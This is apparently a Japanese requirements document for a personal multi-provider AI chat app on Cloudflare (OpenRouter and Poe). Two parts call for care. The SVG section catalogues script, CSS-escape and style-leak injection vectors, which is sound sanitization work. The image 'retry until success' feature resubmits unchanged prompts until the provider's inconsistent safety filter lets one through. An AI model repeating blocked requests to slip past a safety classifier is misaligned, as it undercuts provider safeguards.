## 1. プロジェクト概要

### 1.1 目的

ChatGPT / Claude のような AI チャットインターフェースを個人用に構築する。
OpenRouter API を通じて複数プロバイダのモデルを単一の UI から利用できるようにする（Poe に近い体験）。**Poe API にも対応済み**（`POE_API_KEY` を設定するとPoeのモデルが一覧に加わり、サブスクのポイントで利用できる。Poeの `/v1/models` はコンテキスト長・価格・画像入力可否・thinking対応をモデルごとに返すため、これらはOpenRouterのモデルと同じように扱う。Web検索・プロンプトキャッシュ指定等のOpenRouter固有機能はPoeモデルでは無効）。将来的には fal API 等にも対応する。

### 1.2 利用者・利用環境

| 項目 | 内容 |
|---|---|
| 利用者 | 本人のみ（シングルユーザー） |
| 端末 | iPhone（Safari）、Mac（Safari / Chrome） |
| アクセス形態 | Web ブラウザからいつでもアクセス（常時稼働のクラウドホスティング） |
| リポジトリ | GitHub 公開リポジトリ（完成後プライベート化） |

### 1.3 予算

- 無償が望ましい。上限は月額 500 円程度。
- 想定構成（後述）では通常利用で **月額 0 円** に収まる見込み。

## 2. システム構成（インフラ）

Cloudflare のサービス一式で構成する。個人利用の規模であれば全て無料枠内。

| 役割 | サービス | 備考 |
|---|---|---|
| ホスティング / API | Cloudflare Workers（+ 静的アセット） | SSR・API・生成の実行（Durable Object） |
| データベース | Cloudflare D1（SQLite） | 会話・メッセージ・ボット定義など |
| ファイルストレージ | Cloudflare R2 | 送受信画像・添付ファイル。egress 無料 |
| 認証 | Cloudflare Access（Zero Trust） | アプリ手前でメール OTP / Google IdP 認証 |
| デプロイ | GitHub 連携（Workers Builds） | push で自動デプロイ |

### 2.1 技術スタック

- **フロントエンド**: React。フレームワークは Cloudflare Workers 上でネイティブに動作する **React Router v8（旧 Remix）**（Next.js は OpenNext 経由となりビルドが重いため採らなかった）。
- **言語**: TypeScript
- **DB アクセス**: 素の SQL（`app/lib/db.server.ts`）。当初は Drizzle ORM を想定していたが、この規模ではクエリを直接書いたほうが読みやすく、バンドルも軽いため採らなかった。スキーマは起動時に自動適用する（マイグレーションのコマンド操作は不要）。
- **LLM ストリーミング**: 生成は Durable Object のアラームの中で実行し、途中経過を D1 に書く。クライアントはそれをポーリングして表示する。ブラウザから SSE を中継する形にしていない理由は、接続が切れると生成も止まってしまうため（§3.3 参照）。
- **テスト**: vitest。Workers のバインディング（D1・R2）に触らない層を対象にする。型チェック・ESLint とあわせて GitHub Actions で回す。

### 2.2 認証（Cloudflare Access）

- アプリの手前で Cloudflare Access が認証を行い、本人のメールアドレスのみ許可する。
- アプリ側の認証実装はほぼ不要。ただし多層防御として、Worker 側でも Access の JWT（`Cf-Access-Jwt-Assertion`）を検証する。
- セッション期間は長め（例: 1 ヶ月）に設定し、スマホでの再ログイン頻度を下げる。
- 注意: Access ポリシーを適用するには、ドメインが Cloudflare ゾーン上にあること（またはワンクリック Access 対応のあるデプロイ形態）が必要。無料で済まない場合の代替はカスタムドメイン取得（年 1,000〜1,500 円程度 → 月換算で予算内）。

### 2.3 API キーの扱い（セキュリティ要件）

- OpenRouter の API キーは **Workers の Secret としてサーバー側のみに保持** し、クライアントには一切渡さない。
- LLM への全リクエストは Worker を経由する（クライアント → Worker → OpenRouter）。
- 公開リポジトリであるため、キー・個人情報は一切コミットしない（`.dev.vars` / Secrets で管理）。

## 3. 機能要件

### 3.1 モデル管理【特別要件①】

- **OpenRouter のモデル一覧 API（`GET /api/v1/models`）を実行時に取得**し、アプリの実装を変更せずに常に最新のモデル一覧を閲覧・選択できる。
  - 一覧はサーバー側で短時間（例: 1 時間）キャッシュする。
- モデル一覧では以下ができる:
  - 名前・プロバイダによる検索 / フィルタ
  - コンテキスト長、入出力価格、モダリティ（画像入力可否）等のメタ情報表示
  - **最近よく使うモデルの上位表示**: 明示的なお気に入り登録は求めず、使用実績から自動で上位に出す。順位は「頻度 × 新しさ」（使うごとに加点し、前回使用からの経過で指数的に減衰。半減期2週間）で決め、上位5件を一覧の先頭に別枠で出す。記録は端末ローカル（localStorage）に持ち、生成に実際に使ったときだけ数える。検索中は表示しない。
  - **新着モデルの強調**: 公開されたばかりのモデルは、行の左端にアクセント色のバーと `NEW` バッジを付けて目立たせる。判定はモデル一覧APIが返す公開日のみで、手作業の新着リストは持たない（日が経てば自動で外れる）。何日出すかは設定画面で変更でき、既定は3日・0で無効。
- 会話の途中でもモデルを切り替えられる。
- **取れなかったときは黙って済ませない**。モデル一覧と為替は初回表示を待たせない
  ため画面の裏で取りに行くが、失敗を握りつぶすと、利用者からは理由の分からない
  故障にしか見えない（モデル一覧が無ければ選べるモデルが0件になり、送信もできない）。
  待てば直るもの（コールドスタート・瞬断・429・5xx）は間を空けて数回投げ直し、
  それでも駄目なら理由と「再試行」を画面に出す。4xx は投げ直しても同じ答えなので
  待たずに諦める。前回の一覧が端末に残っていればそれを出したうえで、古いものを
  見ていることを伝える。

### 3.2 ボット（プリセット）機能【特別要件②】

- 「モデル + システムプロンプト」の組み合わせを **ボット** として登録できる。
- ボットに含める項目:
  - 名前、アイコン（絵文字またはアップロード画像）
  - モデル ID
  - システムプロンプト
  - 生成パラメータ: 選択モデルが対応するパラメータ（OpenRouter の `supported_parameters`）だけをフォームに表示する。各項目は「自動/手動」方式 — 自動は API に送信せずモデル本来の既定値に任せ、手動にした項目だけ明示値を送る（モデル別の公式既定値は API で取得できないため）。「初期設定に戻す」= 全項目を自動に戻す（実行前に確認）
- ボットの作成 / 編集 / 複製 / 削除ができる。
- 新規チャット開始時にボットを選択できる（ボットを使わない素のモデル選択も可能）。ボットを選んだあとに「新規チャット」を押すと、選択が外れてボットのランチャーへ戻る。
- ボット編集は既存会話に遡及しない（会話開始時点の設定で継続。切替は明示操作）。

### 3.3 チャット（基本機能）

- **新規チャットの1通目では画面を移らない**。生成はサーバー側で進み、画面はポーリングで
  追いかけているので、ここでページ遷移すると画面が作り直されて追従が切れる。URL だけを
  差し替え（リロードしても新規チャットに戻されないように）、React Router から見た現在地は
  あとから合わせ直す。合わせ直しの遷移には次の2つの歯止めを置く——どちらも画面を作り
  直す動作なので、走らせてよい場面が限られる。
  - **利用者が自分で移っていたら引き戻さない**（分岐・別会話）。URL が生成開始時に
    差し替えたままかどうかで見る。
  - **次の生成が始まっていたら合わせ直さない**。応答の取り直しとタイトル生成には数秒
    かかり、その間に2通目を送られると、後追いの遷移が進行中の表示ごと捨ててしまう。
    合わせ直しは次に落ち着いたときで間に合う。

- 選択したモデル / ボットとのチャット。
- **ストリーミング表示**（サーバーが書いた途中経過をポーリングで追う）。生成の停止ボタンあり（停止はどの端末からでも有効）。
- **スマート自動スクロール**: 最下部にいるときだけ生成に追従し、上へスクロールした状態では画面位置を固定する（過去メッセージの操作を妨げない）。
- **サーバー側生成**: 応答の生成と保存は Durable Object 内で進行し、途中経過も定期保存される。リロードや別端末からのアクセスでも生成中の応答をリアルタイムに閲覧・再開できる。**ブラウザを閉じても生成は完了まで継続する**（時間制限なし。生成待ちは通信待ちのため CPU 制限にも抵触しない）。
- **サブリクエストの上限を跨がない**: Workers は1回の呼び出しで出せるサブリクエストの数に上限があり、無料プランでは外部への `fetch` が50件、D1・R2など内部サービスへが1,000件。**D1やR2の呼び出しも数に入る**。使い切ると以降のリクエストがその場で失敗し、利用者には「上流への接続に失敗しました」と見える。したがって、
  - 何度も上流へ投げる「成功するまで生成」は、1回のアラームで走り切らせない。上限の手前で切り上げて途中経過をDOのストレージへ書き、次のアラームで続きを走らせる（アラームは呼び出しが別なので、そのたびに枠が戻る）。試行の本数だけでなく、生成画像の取り込み（Poeは本文にCDNのURLを返すため1枚につき1件の外部取得が要る）も同じ枠を使う。
  - 取り込みきれなかった画像は**URLを本文に残したまま**次の実行へ持ち越す。ここでURLを捨てると、期限付きCDNを返す上流ではあとから画像が消えてしまう。
  - 部分保存は1回のbatchにまとめ（更新と停止確認で2往復しない）、長い応答では途中から保存間隔を広げる。生成中はこれが最も高い頻度で走るため、内部サービスの枠に一番近づくのがここになる。
- **Markdown レンダリング**: GitHub Flavored Markdown（表・チェックリスト・取り消し線・脚注）、コードブロックのシンタックスハイライトとコピーボタン、数式（KaTeX）。数式は `$…$` `$$…$$` に加えてモデルがよく使う `\(…\)` `\[…\]` `\begin{align}…\end{align}` も解釈する。`<br>` `<sub>` `<ruby>` 等の生HTMLはサニタイズしたうえで通す。
- **警告ブロック**: `> [!NOTE]` `[!TIP]` `[!IMPORTANT]` `[!WARNING]` `[!CAUTION]` を、種類ごとの色とアイコン付きの枠で表示する（GFM の仕様外なので自前の remark プラグインで解釈する）。
- **Mermaid 図表**: ` ```mermaid ` のコードブロックをフローチャート・シーケンス図などの図として描画する。ソースの表示切替、ソースのコピー、SVGでの保存ができる。
  - 描画はブラウザに出てからで、mermaid 本体はそのとき初めて読み込む（依存込みで約7MBあり、Workers のバンドルに入れるわけにいかないため `lib/mermaid.client.ts` に隔離してある）。
  - **生成中は図にしない**。本文が伸びている間に描くと、書きかけの図が何度も描き変わってちらつく。ブロックの中身が増えなくなってから図にするので、先に閉じた図は本文がまだ流れていても描かれる。
  - 構文が壊れているものは図にせず、コードブロックのまま理由を添えて出す（生成が途中で止まった場合もこの形になる）。
  - 図の配色はライト / ダークに追従する。
- **SVG 図版**: ` ```svg ` / ` ```xml ` のコードブロックが SVG なら図として描く。レーダーチャートのように Mermaid では描けない図を、モデルは SVG の生ソースで返してくるため。ソースの表示切替・コピー・保存ができる。
  - ` ```xml ` は設定ファイルなどにも使われるので、**中身が本当に `<svg` で始まるときだけ**図にする（XML宣言・DOCTYPE・コメントは読み飛ばす）。
  - **消毒してから描く**。SVG はスクリプトも外部読み込みも書ける文書形式で、本文はモデルの出力なので次を潰す: `<script>` / `on*` 属性 / `javascript:` リンク、`<foreignObject>`（任意のHTMLを差し込める抜け道）、`<animate>` `<set>`（後から属性を書き換える手口）、外部への通信（`<image href="https://…">` `<use>`、CSS の `@import` と `url()`）。参照してよいのは図の中（`#…`）と埋め込み済み画像（`data:image/…`）だけ。CSS は `url()` のほか `image-set()` `cross-fade()` `image()` も外部を取りに行けるので同じく潰す。さらに CSS は関数名そのものをエスケープで書けるため（`\75 rl(…)` はブラウザにとって `url(…)`）、掃除したあとのエスケープを解いてもう一度掃除し、そこで初めて何かが落ちるならその CSS は丸ごと捨てる（図の見た目より安全を採る）。
  - **shadow DOM に入れて描く**。SVG 内の `<style>` は、そのまま本文へ差し込むと SVG の外——ページ全体にも効いてしまう（`<style>*{display:none}` だけで画面を白紙にできる）。クラスで色を付ける SVG は多いので `<style>` は残し、代わりに閉じ込める。
  - 大きさは作者が想定した幅を上限に、狭い画面でだけ縮める。枠いっぱいに引き伸ばすと文字や線が拡大されて不格好になるため。高さにも上限を置き、画面を覆えないようにする。
  - **暗いときは配色を作り直す**。モデルの SVG は白い紙に黒い線と文字、という前提で描かれていることが多く、暗い地の上ではそのままでは読めない。かといって全部を反転すると、データの色（棒グラフの色分け、赤=悪/緑=良、ヒートマップ）まで別物になる。そこで**彩度の低い色だけ**を入れ替える。
    - 彩度がほぼ無い色（背景・文字・罫線）は、**白い紙に対する contrast を引き継ぐ**明るさに置く。明度をひっくり返すだけだと中間の灰色が中間の灰色のまま残り、薄墨で書いた控えめな軸ラベルが暗い地の上でほとんど見えなくなる。真っ黒な文字は白く、紙そのもの（白）は地の色ちょうどに落ちる。
    - 彩度のある色（データそのもの）は色相も鮮やかさも残し、暗すぎて沈むものだけ明るくする。
    - 明度と彩度は OKLab で測る。色の解釈はブラウザ自身に任せる（canvas 経由）ので、名前付きの色 148 種の表を持たずに済む。
    - 埋め込み画像（`data:image/…`）は触らない。
    - 自動の置き換えなので必ず当たるとは限らない。ツールバーから**元の配色にも戻せる**。
  - 元の配色で見るときの下地は明るい面、置き換え後は暗い面（contrast の基準もこの色）。
  - 生成中は図にしない（`</svg>` で閉じるまで待つ）。Mermaid と同じ扱い。
- **化学式**: `$\ce{H2O}$` `$\ce{2H2 + O2 -> 2H2O}$`（KaTeX の mhchem）。モデルは化学式を TeX で書くことが多いため、独自記法ではなく数式の側で受ける。
- **上付き**: `10 m^2^` `注記^1^`。下付きの `~…~` は採用しない——`~` は1個で発火するので `~/.config` と `~/bin` が同じ行にあるだけで誤爆する。下付きが要るのはほぼ化学式なので mhchem に任せる。
- **数式のコピー**: 数式を選択してコピーすると、描画結果ではなく元の TeX が渡る（KaTeX の copy-tex）。
- **表**: 横スクロールに加えて、見出しを押すと並べ替え（昇順→降順→元の並び）、タブ区切りでのコピーができる。並べ替えは表示だけで保存内容には触らない。数値は桁区切りや単位が付いていても数として比べる。
- **リンク**: 外部リンクは別タブで開き、表示名にドメインが含まれないときは行き先のドメインを小さく添える（`[公式サイト](https://よく似た別ドメイン)` に気づけるように）。`javascript:` などのスキームは remark / サニタイズの両方で落とす。
- **入力と思考プロセスもマークダウンで表示**: 貼り付けた表やコードがそのまま読める。地の色が本文と違うので、配色は周囲から継ぐ（`.chat-bubble`）。図だけはソースのまま見せる（本文より目立つため）。
- **生成中の描き直し**: 確定した本文は「もう変わらない塊」に分けて描く。増えた末尾だけを解析すれば済むので、長い応答ほど描き直しが軽くなる（実測で描き直しの合計時間が約 1/3）。切ってよいのは前後を別々に解析しても同じ結果になる境目だけで、脚注や参照リンクの定義がある文書はまるごと1つとして扱う。
- **経過秒数の表示**: 画像を出力するモデルの生成中は「画像を生成中…（N秒）」を出す。本文が流れてこないぶん待ち時間の手がかりが無いため。秒はクライアントが開始時刻（`messages.created_at`）から刻み、サーバーは書かない（毎秒のD1書き込みを避けるため）。「成功するまで生成」の進捗表示も同じ仕組み。
- **コンテキストクリア**: 入力欄の左のほうきアイコンで、会話の現在位置に「ここまではモデルへ渡さない」区切りを引ける。
  - **履歴は消えない**。以後の生成でモデルへ送る範囲が狭まるだけで、過去のやり取りは今までどおり読める。アイコンにゴミ箱・消しゴムを使わないのはこのため。
  - **可逆**。メッセージの削除選択モードで区切りの行をタップして選び、削除ボタンで消せる（メッセージと同じ操作）。消すと再び全体がコンテキストになる。
  - 押しても読んでいた位置は動かさない。
  - 実体は `messages.context_boundary`。表示中のパスに複数あるときは最後のものが効く。
- メッセージ操作:
  - 自分のメッセージの **編集して再送信**
  - アシスタント応答の **再生成**
  - 個別メッセージのワンタップコピー（送受信両方）
  - メッセージの一括削除: 削除ボタンで選択モードに入り、複数選択して確認のうえ削除。削除ノードはツリーから抜き取り、前後のメッセージは繋ぎ直す
- **画像添付**（マルチモーダル対応モデルへの画像入力）。画像は R2 に保存。
  - 添付方法: クリップからの選択、入力欄への貼り付け（スクショ）、ドラッグ&ドロップ。1メッセージあたり8枚まで。
  - 送信前に端末側で長辺2048pxまで縮小しWebP（品質0.85）へ再エンコードする（画質を保ったままトークン費用と通信量を抑える）。
  - モデルへは data: URL として送る（アプリが Cloudflare Access の背後にあり、外部から画像URLを取得させられないため）。
  - 選択中のモデルが画像入力に対応していない場合は入力欄に警告を出す。
  - 添付は編集して再送信・再生成・分岐（フォーク）にも引き継がれる。R2の実体は複数のメッセージで共有し、参照が0になった時点で削除する。
- **画像生成**: 画像の返し方はプロバイダで異なるため、どちらも受けて同じ形に揃える。
  - Poe: 応答本文に上流CDN（`pfst.cf2.poecdn.net`）のURLが入る。期限が切れると過去の会話から画像が消えるため、実体をR2へ取り込み、本文のURLを `/api/files/:id` に差し替える。
  - OpenRouter: 本文ではなく `images` フィールドに base64 の data: URL が入る。取り込まないと表示できない。リクエストに `modalities: ["image", "text"]` を明示しないと画像を返さないため、モデルの `output_modalities` に `image` があるときだけ付ける。
  - 取り込んだ画像は添付（`kind = generated`）として記録し、本文に出てこないものは末尾に画像記法で足す。取り込めなかった画像は元のURLのまま残す（表示はできる）。本文が空でも画像があれば成功として扱う。
- **成功するまで生成（リトライ生成）**: 画像生成はセーフティ判定に揺らぎがあり、問題のない依頼でも弾かれることがある。同じ依頼を投げ直すと通ることが多いため、成功が目標数に達するまで自動で投げ直し、上限試行回数で打ち切る。
  - **成功の判定は「応答に画像が1枚以上あるか」だけ**。拒否文の文言は見ない（言語や表現に依存して壊れるため）。したがって画像を出せるモデルでのみ使える。
  - **プロンプトは書き換えない**。同じ依頼をそのまま再送するだけ。フィルタを回避する方向の加工はしない。
  - 失敗の扱いは3分類。①成功 ②レート制限（429。待ってから投げ直し、**試行回数を消費しない**。ただし待ち直しの回数にも上限を設ける） ③その他すべて（拒否・エラー。試行回数を消費してリトライ）。
  - 会話には**見出しのメッセージを1つ**置き、その下に成功した応答を**直列に**積む（左右の切り替えなしで全部見える）。見出しは実行中は進捗（成功n/N・試行a/A）、終了後は結果の要約と拒否の内訳になる。成功は完了するたびに保存されるので、終了を待たずに順次見られる。
  - 並列数は目標数と別に指定する（既定は目標数と同じ）。**目標数を超えてもよく、超過した成功も捨てない**（並列で走っていた分は既に課金されているため）。試行回数は超えられない。
  - 実行はバッチではなく**空き枠を埋め続ける方式**にする。1本終わるたびにその場で取り込み、空いた枠へ即座に次を発射する。バッチ単位で待つと、先に終わった成功が同じ束の最も遅い1本に足を引っぱられ、表示も進捗も遅れる。取り込み自体は直列化する（成功は前の成功の下に繋ぐため、同時に走らせると親が競合する）。
  - 上限試行回数は設定画面の天井を超えられない。クライアントの値は信用せず、生成のたびにサーバー側でも通す。
  - 走り出す前に**パラメータの確認**を出す（目標・上限・並列・モデル）。
  - 見出しは発射時・完了時のほか毎秒更新し、成功数・試行数・実行中の本数・経過秒を出す（更新が止まると中断とみなす仕組みがあるため、生存確認も兼ねる）。この打ち直しが**停止要求を拾う経路**でもあるので、間隔がそのまま停止の効きの速さになる。打ち直しの回数は1回の実行あたりで頭打ちにし、尽きたら続きを次のアラームへ送る（内部サービスへのサブリクエスト上限を超えないため）。
  - **停止要求は発射の直前に見る**。発射してから確認したのでは、押したあとに1本ぶん余計に投げて課金されてしまう。フラグが立ったあとに新しく飛ぶ本数はゼロでなければならない（残るのは、押してからフラグがD1に載るまでの伝搬時間だけ）。停止ボタンは生成中の行を狙う。停止しても発射済みの分は最後まで受け取る。
  - **並列数ぶんを一度に投げない**。2本目以降は少し間隔を空けて発射する（上流へ同時に当たるのを避ける。生成自体は数十秒かかるので体感は変わらない）。
  - **レート制限は上流の申告に従う**。429 の `Retry-After`、および `x-ratelimit-remaining-requests` / `x-ratelimit-reset-requests` を見て、待つべき時間だけ待つ。残りが尽きかけていれば超える前に発射を控える。ヘッダを返さない上流もあるので、無ければ従来の固定バックオフに落ちる（依存はしない）。
  - 実行中にリロードした・別の端末やタブで開いた場合も、**表示中のパスに生成中の行があれば追跡を再開する**。このモードでは生成中なのは見出しで、成功はその下に積まれるため、末尾の行だけを見て判断してはならない（判断を誤ると、見出しの経過秒だけが進んで成功した画像が出てこない）。見出しを追う場合は1件ではなく**パスごと**取り直す。
  - Poeの消費ポイントは1回ごとに突き合わせられないため、実行時間帯の履歴を合計して見出しに出す。
- **生成画像の取り込み**: 上流が返した画像は実体をR2へ移し、本文中のURLを自前の配信URL（`/api/files/:id`）へ差し替える。**画像記法を使わずURLだけを返すボットがある**ので、素で差し替えると本文が `/api/files/…` というテキストだけになって画像が出なくなる。記法の中に無いURLは、差し替えるときに画像記法で包む。
- **生成画像を次の発言で使う**: 生成画像はモデルへ送り返さない（アシスタントの発言に画像を付ける形式がOpenAI互換APIに無い）。編集・リスタイル・合成は「最新のユーザーメッセージの添付」として渡す決まりなので、応答の「この画像を使う」から入力欄の添付に載せられるようにする。実体はR2にあるためアップロードは不要で、添付IDをそのまま次の発言へ引き継ぐ。
- **画像一覧**: サイドバーの「画像」から、生成画像を新しい順に一覧できる。会話ツリーの現在のパスとは無関係に、行が存在する限り出す（再生成や分岐で表示から外れた画像も消えない）。タップで原寸表示。フォークで実体を共有する行は重複させない。メッセージを削除したときは従来どおり添付も消える。
  - **検索**: 依頼文・モデル名・会話タイトルを対象に、空白区切りの語をANDで探す。依頼文は生成時に添付へ写しておく（会話ツリーを遡らずに引けるようにするため。リトライ生成では成功が直列に積まれ、依頼文が直接の親ではなくなる）。
  - **お気に入り**: 各画像の「…」から付け外しでき、ヘッダーのトグルで絞り込める。実体を共有する行（フォーク先）もまとめて揃える。
  - **読み込み**: 末尾が近づくと次のページを自動で読む（400px手前から先読み）。一番上で下へ引っぱると一覧を取り直す（引っぱり量は指の移動の半分、64pxで実行）。
  - 各画像の「…」から、生成元の会話を開く・お気に入り・原寸表示ができる。ホバーできない端末では「…」を常時表示する。
- **Web検索・URLの読み取り**: **既定でオン**とし、ヘッダーの⚙（生成パラメータ）パネルのトグルで会話ごとにオフにできる（設定は会話に保存）。オン時は検索・取得ごとに少額の追加料金が発生する。Poe には相当機能がないため、Poe モデル選択時はトグル自体を表示しない。渡し方はモデルの対応状況で二段構えにする。
  - **サーバーツール**（`openrouter:web_fetch` / `openrouter:web_search`）: tool calling 対応モデルではこちらを使う。モデルが必要だと判断したときに自分で呼び、**実行はOpenRouter側で完結する**ため、こちらにツール実行のループは要らない（届くのは今までどおり `content` と、根拠の `annotations` だけ）。**URLを渡せばその本文を読み、必要なら本文中のリンクを自分で辿る**のはこの経路。対応可否はモデル一覧の `supported_parameters` に `tools` があるかで判定し、クライアントが申告する。
  - **検索プラグイン**（`:online`）: tool calling 非対応のモデルはこちら。検索を1回前置きするだけで、リンクは辿らない。サーバーツールを渡すときは接尾辞を付けない（同じ検索を二重に走らせないため）。
  - サーバーツールはbetaで指定の形が変わりうるため、`tools` を含むリクエストが 400 で弾かれたときは検索プラグインへ落として応答を返しきる（外部リクエストを1件余計に使うのはこの失敗経路だけ）。
- **参照元（出典）の表示**: Webツールを使った応答には、上流が `annotations`（`url_citation`）として**本文とは別枠で**参照元を返す。モデルに「出典を書け」と指示して本文へ書かせるのではないので、**本文は一切変わらない**（コピーしても、次のターンでモデルへ送り返す履歴にも出典は混ざらない）。
  - 保存も本文とは別に持つ（`messages.citations_json`）。思考（reasoning）と同じ扱い。1応答あたり30件で頭打ちにし、同じURLは落とす。
  - 表示は本文の下の折りたたみ。題名が欠けて届くことがあるのでホスト名で代替する。参照元が無い応答には何も出さない。フォーク先には引き継がない（思考と同じ）。
- **思考（thinking / reasoning）**: 対応モデルでは思考の深さを設定できる。思考内容はストリーミング表示し、完了後は折りたたみで確認できる。思考テキストは会話とともに保存する。指定方法はプロバイダで異なる。
  - OpenRouter: `supported_parameters` に `reasoning` があるモデルで、オフ/低/中/高を `reasoning` へ送る。
  - Poe: `/v1/models` の `reasoning` から、モデルが申告する `reasoning_effort` の値と `thinking_budget`（思考トークン上限）の範囲を読み取り、そのモデルで有効な選択肢だけを出す。
- **会話ごとの生成パラメータ**: ヘッダーの⚙からパラメータパネルを開き、その会話にだけ適用されるパラメータを調整できる（ボット会話ではボットの設定が初期状態）。設定は会話に保存される。パラメータはモデルではなく会話に紐付くため、モデルを乗り換えると別プロバイダ向けの設定値が残る。送信時にプロバイダごとの許可リストで必ず絞り、他方の形式が混ざらないようにする。
  - Poe で扱えるのは `temperature` / `stop`（Poeプロトコルが持つもの）と、上記の思考パラメータ、画像生成ボットの `aspect_ratio`。`top_p` や各種ペナルティはPoeプロトコルに無いため出さない。
  - **ボット独自パラメータ**（画像サイズなど）: Poeの `/v1/models` は各モデルの `parameters` でそのボット固有のパラメータを公開している（例: gpt-image-2 は `size` の選択肢 `auto / 1024x1024 / 1536x1024 / 1024x1536`、`quality`、真偽値の `use_mask`）。名前も選択肢もボットごとに違う（`size` のボットも `aspect_ratio` のボットもある）ため決め打ちせず、この申告から入力欄を自動生成する。`schema.enum` は選択式、`type: boolean` はオン/オフ、`minimum`/`maximum` は数値、それ以外は自由入力。`default_value` は「自動」のときの動作として説明に出す。公開していないボットのためには名前と値の自由入力欄を残す。プロンプト本文に `--aspect 16:9` のように書く方法はAPI経由では効かない。
  - **ボットのパラメータの確認**: 診断用に `/api/poe/bot-info?bot=<ボット名>` を用意する。`/v1/models/<ボット名>`（未提供）・`/bots/<ボット名>`（自作ボットのみ）・モデル一覧の該当行を順に叩き、生のJSON（APIキーらしき値は伏せる）を返す。
  - **Poe独自パラメータの送り方**: `thinking_budget` とボット独自パラメータは `extra_body` に入れて送る。ボディ直下に置くと未知フィールドとして400が返る。ただしPoeは `extra_body` の中身も検証しており、そのボットが知らない名前は `Unknown parameter: '...'` で弾かれる（例: gpt-image-2 に `aspect_ratio`）。`reasoning_effort` はOpenAI標準のフィールドなのでボディ直下に置く。
  - 上流がパラメータを弾いたエラー（`Unknown parameter` 等）では、原文に加えて⚙パネルを見直すよう促す一文を添える。
- エラー処理: API エラー・レート制限・残高不足を明示し、再試行できる。本文が空の応答（ツール呼び出し試行等）もエラーとして明示する。
- 使用量の目安表示: 応答ごとのトークン数・概算コスト（OpenRouter のレスポンスメタデータを利用)。コストは**円建て**で表示し（USD/JPYレートは無料API open.er-api.com から取得しサーバー側で半日キャッシュ）、応答詳細ではドル建ても併記する。Poe モデルは応答にコスト情報が載らないため、生成完了後に Poe Usage API（/usage/points_history）を照会して**消費ポイント**（+USD換算額）を表示する。
- **応答の詳細表示**: 各応答のⓘから、モデル・入出力トークン・コスト・時刻・所要時間・生成速度（tok/秒）・キャッシュ読取トークン・思考トークンを確認できる。
- **プロンプトキャッシング**: OpenAI / Gemini / DeepSeek 等は自動適用。Anthropic (Claude) はサーバー側で `cache_control` ブレークポイント（システムプロンプト + 直近2ユーザーメッセージ）を自動付与し、長い会話の入力コストを削減する。
- 入力欄はスマホでの自動ズームを起こさない（フォント16px以上）。入力欄は `translate="no"` でブラウザ翻訳の対象外とし、英文入力が翻訳に壊されないようにする。
- **未読マーク**: 応答の完成時に会話へ未読の印を立て、会話一覧にアクセントカラーの点で出す。生成の途中で会話を離れても、完成したことが分かる。その会話を開いた時点と、開いたまま応答を見届けた時点で消える。会話一覧は画面を表示しているあいだ未読状態を短い間隔（5秒）で引き直し、他アプリから戻ったときは即座に反映する（応答はサーバー側で進むため、別の画面にいるあいだの完成はクライアントからは分からないため）。
- **最新へ戻るボタン**: 会話の最下部から離れているときだけ、入力欄の上に出す。過去を読んでいる最中に生成が完了しても、勝手に飛ばされずに自分のタイミングで追いつける。
- **下書きの自動保存**: 未送信の入力内容は会話ごとに端末へ自動保存され、リロードやページ遷移後も復元される。送信すると破棄される。

### 3.4 会話ブランチ【特別要件③】

- メッセージは **ツリー構造** で保持する（各メッセージが親メッセージ ID を持つ）。
- 任意の過去メッセージから **分岐（ブランチ）を作成** して別の続きを試せる。
- 「メッセージの編集して再送信」「応答の再生成」も内部的にはブランチとして保持し、破壊的に上書きしない。
- 兄弟ブランチ間の切り替え UI（例: `< 2/3 >` のようなページャ）を各分岐点に表示。
- 会話ごとに「現在表示中のリーフ（パス）」を記憶する。
- **「ここから分岐」**: 任意の応答を起点に、そこまでの履歴をコピーした独立の新会話（フォーク）を作成できる。同一会話内で完結する分岐（ページャ）と使い分ける。

### 3.5 会話管理

- 会話の一覧（サイドバー）、新規作成、削除（要確認）、リネーム。各会話の操作は行末の「⋯」メニューに集約。
- タイトルの自動生成（最初のやり取りから安価なモデルで生成）。
- サイドバー見出しの「Chat」は新規チャットへの入口を兼ねる（下部の「新規チャット」ボタンと同じ行き先）。
- 会話のピン留め。ピン留め済み項目はメニューから上下に並べ替え可能。
- **お気に入り**: ピン留めとは別の印。ピン留めがサイドバー最上部への固定なのに対し、お気に入りは常設の「お気に入り」フォルダに集める印で、両方を同時に付けられる。
- **フォルダ**: 会話をフォルダに整理できる。フォルダ名タップでそのフォルダのみの階層表示へ遷移、シェブロンでその場に中身を展開。フォルダ自体もピン留め・リネーム・削除（中の会話は残る）可能。
  - **「お気に入り」フォルダ**は常設で、名前の変更も削除もできない。実体を持たない仮想フォルダで、`conversations.favorite` が立った会話を集めて見せる（実フォルダに入れたままお気に入りにもできる）。
- **検索**: サイドバーの検索欄からタイトル + 会話本文を横断検索できる。スペース区切りはAND、`-語` で除外（マイナス検索）。結果には本文ヒット箇所の抜粋を表示。
- すべての会話・添付ファイルはクラウド（D1 / R2）に保存され、端末をまたいで同期される。

### 3.6 コスト管理

> 月間ソフトリミットまで実装済み（2026-08）。送信前のコスト推定警告は未実装。

万一の不正アクセス・設定ミスによる高額課金リスクを、運用（プリペイド）とアプリの両面で抑える。

- **使用量の台帳**（`usage_events`）:
  - 応答が確定するたびに、額・ポイント・トークン数・モデルを1行として追記する。
    タイトル生成のように会話に残らない支出も同じ台帳へ載せる。
  - `messages.usage_json` とは別に持つ。あちらは応答の詳細表示のためのもので、
    会話やメッセージを消せば一緒に消える。**上限は「使った額」で判定するのだから、
    消しても減ってはいけない**——さもないと会話を消すだけで上限が緩む。
  - 書き込みは `finalizeGeneration` の中。呼ぶ側が複数あり、1つ忘れれば支出が
    見えなくなるため、確定そのものに閉じ込めてある。
- **月間ソフトリミット**:
  - 台帳から当月（**JST の暦月**）の累計消費額を集計する。UTC で切ると月初の
    9時間ぶんが前の月に数えられ、月が変わっても上限が解けない。
  - 設定した月間上限額を超えた場合、生成をブロックし、その旨を表示する
    （設定画面から上限変更 / 一時解除は可能）。一時解除は**対象月を持つ**形にして、
    翌月には自動で戻す（恒久のトグルだと解除したまま忘れる）。
  - 判定は**2箇所**で行う。生成の入口（`api.conversations.$id.generate.ts`）と、
    リトライ生成の発射ループ（`generation.server.ts`）。後者が要るのは、1回の依頼で
    何度も投げる機能だから——入口で1回見るだけでは、上限ぎりぎりで始めた実行が
    大きく踏み越える。踏み越える量は1バーストに収まる。
  - **為替レートが取れないときは通す**。上限は課金事故を防ぐためのもので、無料の
    為替APIが落ちているあいだ生成そのものを止めてしまうと、防ぎたかった損害より
    大きな不便になる。判定できなかったことは使用量の画面に出す。
  - Poe はポイント消費で、Usage API の照会が間に合わないと額が取れない。取れなかった
    分は設定した換算レートで見積もって上限に加える（レート 0 なら加えない）。
